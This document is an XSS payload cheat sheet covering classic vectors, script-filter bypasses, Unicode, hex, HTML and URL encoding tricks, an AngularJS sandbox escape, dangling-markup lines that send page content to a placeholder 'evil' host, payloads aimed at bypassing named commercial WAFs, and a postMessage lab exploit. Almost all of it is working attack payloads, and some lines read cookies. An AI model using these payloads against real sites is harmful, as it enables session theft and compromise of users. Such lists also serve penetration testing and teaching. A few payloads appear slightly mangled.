## Payloads Classics

```python
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
```

## Script tag filter bypass

```python
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
```

## Other tags

```python
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
```

## CharCode encoded

```python
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

## In JS

```python
@domain.com">user+'-alert`1`-'@domain.co
```

## Angular JS

```python
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
```

## No Script

```python
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?
```

## Unclosed Tag

```python
<svg onload=alert(1)//
```

## DOM XSS

```python
“><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
javascript:alert(document.cookie)
\“-alert(1)}//
<><img src=1 onerror=alert(1)>
```

## Restrictions Bypass

```python
No parentheses:

<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert`1`</script>
<script>new Function`X${document.location.hash.substr`1`}`</script>

--------------------------------------------------------------------
No parentheses and no semicolons:

<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

--------------------------------------------------------------------
No parentheses and no spaces:

<script>Function`X${document.location.hash.substr`1`}```</script>

--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):

“onmouseover=“alert(1)
‘-alert(1)-’

--------------------------------------------------------------------
If quote is escaped:

‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//

--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:

<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

--------------------------------------------------------------------
Other (Base64):

<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
```

## Encoded

```python
Unicode:

<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>

--------------------------------------------------------------------
Hex:

<script>eval('\x61lert(1)')</script>

--------------------------------------------------------------------
HTML:

<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//

--------------------------------------------------------------------
URL:

<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

--------------------------------------------------------------------
Double URL Encode:

%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E

--------------------------------------------------------------------
Unicode + HTML:

<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

--------------------------------------------------------------------
HTML + URL:

<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
```

## WAF Bypass

```python
Imperva Incapsula:

%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>

--------------------------------------------------------------------
WebKnight:

<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

--------------------------------------------------------------------
F5 Big IP:

<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">

--------------------------------------------------------------------
Barracuda WAF:

<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

--------------------------------------------------------------------
PHP-IDS:

<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"

--------------------------------------------------------------------
Mod-Security:

<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

--------------------------------------------------------------------
Quick Defense:

<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">

--------------------------------------------------------------------
Sucuri WAF:

1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
```

## With post message

```python
<iframe src="//0a8400e8040626dac07f2462004500ff.web-security-academy.net/" onload="this.contentWindow.postMessage('<img/src=x onerror=print()>','*')">
```